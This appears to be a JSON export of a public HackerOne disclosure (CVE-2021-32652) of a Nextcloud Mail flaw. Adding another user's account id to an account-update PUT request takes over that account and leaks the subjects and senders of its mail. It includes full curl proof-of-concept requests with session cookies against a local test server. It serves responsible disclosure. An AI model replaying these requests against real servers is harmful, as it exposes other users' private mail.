{"id":1094063,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDk0MDYz","url":"https://hackerone.com/reports/1094063","title":"Take over a mail account due missing validation of account id","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2021-02-03T17:20:10.719Z","submitted_at":"2021-02-03T17:20:10.781Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"kesselb","url":"/kesselb","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13291,"url":"https://hackerone.com/nextcloud","handle":"nextcloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Nextcloud","twitter_handle":"nextclouders","website":"https://nextcloud.com","about":"Access, share and protect your files, calendars, contacts, communication \u0026 more at home and in your enterprise."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2021-32652"],"singular_disclosure_disabled":false,"disclosed_at":"2021-06-01T18:10:57.967Z","bug_reporter_agreed_on_going_public_at":"2021-06-01T18:10:57.874Z","team_member_agreed_on_going_public_at":"2021-06-01T18:06:29.621Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"A validation is missing to make sure the account id belongs to the logged in user. \n\nTo reproduce:\n1. Login as user\n2. Add a mail account to mail\n3. Go to account settings\n4. Update the account again\n\nSee a request like below: \n\ncurl 'http://localhost:50001/index.php/apps/mail/api/accounts/%7Bid%7D' \\\n  -X 'PUT' \\\n  -H 'Connection: keep-alive' \\\n  -H 'Pragma: no-cache' \\\n  -H 'Cache-Control: no-cache' \\\n  -H 'Accept: application/json, text/plain, */*' \\\n  -H 'requesttoken: qsnlh1ctCuo7T2KZ6F/8mxIXHXVpsBvvzPJRqvU+88M=:kqXVxiFjcJJWPjPzvRyO+WNGUB4N1k+ZlaAC2JBtnY0=' \\\n  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36' \\\n  -H 'Content-Type: application/json;charset=UTF-8' \\\n  -H 'Origin: http://localhost:50001' \\\n  -H 'Sec-Fetch-Site: same-origin' \\\n  -H 'Sec-Fetch-Mode: cors' \\\n  -H 'Sec-Fetch-Dest: empty' \\\n  -H 'Accept-Language: en-US,en;q=0.9,de;q=0.8' \\\n  -H 'Cookie: oc_sessionPassphrase=%2Fsi20cgXowTcmrwZL5Ur%2FUFYByHCAyhwo0Z%2B8V%2Bk2yL9nZpqlzfKOMcxVabLYE7dfTrV1hR7%2Fsnu83fG3GZdiJ5DjHLKD79XaH91L4G%2FNNlD9SbBq%2FMWOIIrYLGqCVnj; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; oc64oi0n8x29=c32fab57ad6d8cbe8e4d8e118f54759a; nc_username=bob; nc_token=HQlkh1JxcSadkeAI8HzBM0ewQDuIfk%2BU; nc_session_id=c32fab57ad6d8cbe8e4d8e118f54759a' \\\n  --data-raw '{\"autoDetect\":false,\"accountName\":\"bob\",\"emailAddress\":\"bob@localhost.test\",\"imapHost\":\"imap\",\"imapPort\":993,\"imapSslMode\":\"ssl\",\"imapUser\":\"user@domain.tld\",\"imapPassword\":\"mypassword\",\"smtpHost\":\"imap\",\"smtpPort\":25,\"smtpSslMode\":\"tls\",\"smtpUser\":\"user@domain.tld\",\"smtpPassword\":\"mypassword\"}' \n\nTake the request and append id to body. id is the account id of another account.\n\ncurl 'http://localhost:50001/index.php/apps/mail/api/accounts/%7Bid%7D' \\\n  -X 'PUT' \\\n  -H 'Connection: keep-alive' \\\n  -H 'Pragma: no-cache' \\\n  -H 'Cache-Control: no-cache' \\\n  -H 'Accept: application/json, text/plain, */*' \\\n  -H 'requesttoken: qsnlh1ctCuo7T2KZ6F/8mxIXHXVpsBvvzPJRqvU+88M=:kqXVxiFjcJJWPjPzvRyO+WNGUB4N1k+ZlaAC2JBtnY0=' \\\n  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36' \\\n  -H 'Content-Type: application/json;charset=UTF-8' \\\n  -H 'Origin: http://localhost:50001' \\\n  -H 'Sec-Fetch-Site: same-origin' \\\n  -H 'Sec-Fetch-Mode: cors' \\\n  -H 'Sec-Fetch-Dest: empty' \\\n  -H 'Accept-Language: en-US,en;q=0.9,de;q=0.8' \\\n  -H 'Cookie: oc_sessionPassphrase=%2Fsi20cgXowTcmrwZL5Ur%2FUFYByHCAyhwo0Z%2B8V%2Bk2yL9nZpqlzfKOMcxVabLYE7dfTrV1hR7%2Fsnu83fG3GZdiJ5DjHLKD79XaH91L4G%2FNNlD9SbBq%2FMWOIIrYLGqCVnj; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; oc64oi0n8x29=c32fab57ad6d8cbe8e4d8e118f54759a; nc_username=bob; nc_token=HQlkh1JxcSadkeAI8HzBM0ewQDuIfk%2BU; nc_session_id=c32fab57ad6d8cbe8e4d8e118f54759a' \\\n  --data-raw '{\"autoDetect\":false,\"accountName\":\"bob\",\"emailAddress\":\"bob@localhost.test\",\"imapHost\":\"imap\",\"imapPort\":993,\"imapSslMode\":\"ssl\",\"imapUser\":\"user@domain.tld\",\"imapPassword\":\"mypassword\",\"smtpHost\":\"imap\",\"smtpPort\":25,\"smtpSslMode\":\"tls\",\"smtpUser\":\"user@domain.tld\",\"smtpPassword\":\"mypassword\",\"id\":1}' \n\nThe next request to\n\ncurl 'http://localhost:50001/index.php/apps/mail/api/messages?mailboxId=35\u0026filter=is:pi-other\u0026limit=20' \\\n  -H 'Connection: keep-alive' \\\n  -H 'Pragma: no-cache' \\\n  -H 'Cache-Control: no-cache' \\\n  -H 'Accept: application/json, text/plain, */*' \\\n  -H 'requesttoken: 8q7mksjCgQLYbuJqIohYZg6zv8OCkERjy7v4SEW7G9w=:ysLW076M+3q1H7MAd8sqBH/i8qjm9hAVkumrOiDodZI=' \\\n  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36' \\\n  -H 'Sec-Fetch-Site: same-origin' \\\n  -H 'Sec-Fetch-Mode: cors' \\\n  -H 'Sec-Fetch-Dest: empty' \\\n  -H 'Accept-Language: en-US,en;q=0.9,de;q=0.8' \\\n  -H 'Cookie: oc_sessionPassphrase=%2Fsi20cgXowTcmrwZL5Ur%2FUFYByHCAyhwo0Z%2B8V%2Bk2yL9nZpqlzfKOMcxVabLYE7dfTrV1hR7%2Fsnu83fG3GZdiJ5DjHLKD79XaH91L4G%2FNNlD9SbBq%2FMWOIIrYLGqCVnj; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; oc64oi0n8x29=c32fab57ad6d8cbe8e4d8e118f54759a; nc_username=bob; nc_token=HQlkh1JxcSadkeAI8HzBM0ewQDuIfk%2BU; nc_session_id=c32fab57ad6d8cbe8e4d8e118f54759a' \\\n  --compressed\n\nreturns a list of messages like in the screenshot.\n\n## Impact\n\nSubject, sender and meta information about some mails are leaked.","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":1182516,"file_name":"Screenshot_from_2021-02-03_18-17-13.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/p3e69yog05x3axc7bomurgpio3sn?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2021-02-03_18-17-13.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2021-02-03_18-17-13.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRIN5EFBE%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132412Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCIBhBo9%2BUqNxY%2Bdl%2FBu6j6mVjFeVGWlX5BwuNk30B2pI7AiBQHUUbG%2FDPlDr8hIO32FMCMyDmnYxvDdVBvosTOZwinyqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIM8sXPkJOx9vMC77IEKtcDIV9fcoJlSEMqzyGBN8r5cvnWs1RDUOFGGZvMSBD3mEA7oDpMSi%2BV7Zp9cOht07PFLX%2BkJK8eC1UTkCn542dx8VJGQsKAyVMnUijrNudvAtZaz4XmN54QO8IAmSWJAz1M4dpRjKM3mpj%2FRtGlWd3KN52y5erIqbsZL2gDnrA%2FRb3fgap6IHD7xfj6d0gbxTW4t4%2FdNxTbdiUOs%2BzGzj%2FLTVG1Y2pAFSOg%2FtQWuve8SbkTy352fvT3gWDrJKVFK4FnKn4DMECasTJgeWjjC5%2FMBxmNQ4Ck1dV%2Bd2U1r3%2FXszmBUhzCVAnW%2BBtuglfqKxlek0HFP2W%2FAgf7HsdcRXu4XQ9grbRgh1ZNM9yCRee%2FQ8AoIWmoCQS%2BbBfiZfI9t95HA%2Fnu0iExODE3gc%2FeDNILImEbUu8YNyftwi4u%2BBTFJzhLm45mJqK2nq8%2F1P%2BZ%2FjDCVTu7n6SR3CDOMKZAj5KEc2HF25gj0XTKyS4MKzzEI3%2B1%2BX1BRUu%2Ft%2Foofn%2BCL69KENTohq5xEcSjfjHYy%2FruEuKnSzzB2Olo0%2Fch%2Bgu9EjjuR5sCj5hDvticB%2BiLsNWB0Sjpt4T5BO2Gz9yWZ5R7UDjFjBikyO0qI3cmEMuMQ9c4%2Bi%2BthNSEMOrskIsGOqYBSW5YtERPJhE422%2BOJ%2FODVERL3856%2BJxv6Gylf0pw9PAOnyl%2FoQCO3GPLC6BDKKKCT0DANAMHRViXtizwdYWxIVcxRRpAFRuplthRNuoekn7M%2BD9Vyq2Ves6bm56gWv49amyryPOpp3Kpzb30DAEAyzl0ZK%2BqfWyDzq5HLSIy5lGtjLObsOuLdF%2BYMEHir%2BrCGGp%2FmWPemSN9vmdtiNbqa6zyiUuPDw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=d4d15709e700b2210f2fe84c30a0e373fd176be990d99a3784fb124e6152be62","file_size":177640,"type":"image/png"}],"allow_singular_disclosure_at":"2021-07-01T18:06:29.733Z","allow_singular_disclosure_after":-8795862.905605169,"singular_disclosure_allowed":true,"vote_count":12,"voters":["wi11","ali","yusuf_furkan","akashhamal0x01","sidemeet","naveenpawar","adbagel","mafia003","pratapshrestha","meispi","and 2 more..."],"severity":{"rating":"medium","score":5.4,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":45132,"asset_type":"SOURCE_CODE","asset_identifier":"nextcloud/mail","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10564462,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.","automated_response":true,"created_at":"2021-02-03T17:20:11.177Z","updated_at":"2021-02-03T17:20:11.177Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10564880,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Nice catch, @kesselb :)","automated_response":false,"created_at":"2021-02-03T17:26:23.015Z","updated_at":"2021-02-03T17:26:23.015Z","actor":{"username":"lukasreschkenc","cleared":false,"url":"/lukasreschkenc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10622207,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"As an internal finding this issue does not qualify for a bounty.","automated_response":false,"created_at":"2021-02-09T12:41:35.051Z","updated_at":"2021-02-09T12:41:35.051Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11697243,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2021-05-11T11:34:57.430Z","updated_at":"2021-05-11T11:34:57.430Z","actor":{"username":"lukasreschkenc","cleared":false,"url":"/lukasreschkenc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"kesselb","url":"/kesselb"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11950795,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","automated_response":false,"created_at":"2021-06-01T18:05:58.139Z","updated_at":"2021-06-01T18:05:58.139Z","cve_ids":["CVE-2021-32652"],"actor":{"username":"lukasreschkenc","cleared":false,"url":"/lukasreschkenc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11950801,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-06-01T18:06:29.649Z","updated_at":"2021-06-01T18:06:29.649Z","first_to_agree":true,"actor":{"username":"lukasreschkenc","cleared":false,"url":"/lukasreschkenc","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11950851,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-06-01T18:10:57.907Z","updated_at":"2021-06-01T18:10:57.907Z","actor":{"username":"kesselb","cleared":false,"url":"/kesselb","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11950852,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-06-01T18:10:58.035Z","updated_at":"2021-06-01T18:10:58.035Z","actor":{"username":"kesselb","cleared":false,"url":"/kesselb","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}